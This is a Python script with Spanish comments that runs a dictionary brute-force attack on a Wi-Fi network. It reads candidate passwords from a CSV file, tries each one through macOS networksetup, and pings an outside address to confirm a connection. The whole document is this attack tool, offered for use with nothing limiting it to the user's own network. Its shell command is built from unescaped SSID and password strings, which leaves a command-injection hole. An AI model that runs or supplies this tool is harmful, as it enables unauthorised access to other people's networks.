import csv
import os
import subprocess
import time
from colorama import Fore, Style
from tqdm import tqdm

def connect_to_wifi(interface, ssid, password):
    command = f"networksetup -setairportnetwork {interface} {ssid} {password}"
    subprocess.run(command, shell=True)

def check_internet_connection():
    try:
        subprocess.check_output(["ping", "-c", "1", "8.8.8.8"])
        return True
    except subprocess.CalledProcessError:
        return False

def main():
    interface = "en1"  # Reemplaza con tu interfaz de Wi-Fi
    csv_file = "credenciales_wifi.csv"  # Reemplaza con la ruta de tu archivo CSV

    # Pregunta al usuario el nombre de la red
    ssid = input("Ingresa el nombre de la red Wi-Fi (NombreDeLaRed): ")

    with open(csv_file, newline='', encoding='utf-8') as csvfile:
        reader = csv.reader(csvfile)
        passwords = [row[0] for row in reader]  # La columna contiene solo las contraseñas

    print(f"\nProbando contraseñas para {Fore.CYAN}{ssid}{Style.RESET_ALL}\n")
    for password in tqdm(passwords, desc="Intentos", unit="contraseña"):
        connect_to_wifi(interface, ssid, password)
        time.sleep(10)  # Ajusta según sea necesario para permitir la conexión

        if check_internet_connection():
            print(f"\n{Fore.GREEN}Conectado a Internet. ¡Éxito!{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}Falló el intento con la contraseña {password}.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
